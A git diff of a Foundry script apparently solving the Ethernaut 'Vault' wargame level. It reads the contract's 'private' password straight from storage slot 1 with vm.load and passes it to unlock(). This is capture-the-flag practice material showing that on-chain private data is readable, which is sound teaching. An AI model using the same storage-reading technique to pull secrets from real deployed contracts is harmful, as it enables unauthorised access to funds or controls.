@@ -5,8 +5,12 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+import {stdStorage, StdStorage} from "forge-std/Test.sol";              
 
-contract ForceSolution is Script, EthernautHelper {
+
+contract VaultSolution is Script, EthernautHelper {
+    using stdStorage for StdStorage;
+
     address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
     uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
 
@@ -16,8 +20,17 @@ contract ForceSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
-
+        
+        /**
+         * Following function doesn't work for private variable.
+         *
+         * (, bytes memory returnData) = challengeInstance.call(abi.encodeWithSignature("password()"));
+         * bytes32 password = abi.decode(returnData, (bytes32));
+         *
+         */
+         
+        bytes32 password = vm.load(challengeInstance, bytes32(uint256(1)));
+        challengeInstance.call(abi.encodeWithSignature("unlock(bytes32)", password));
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
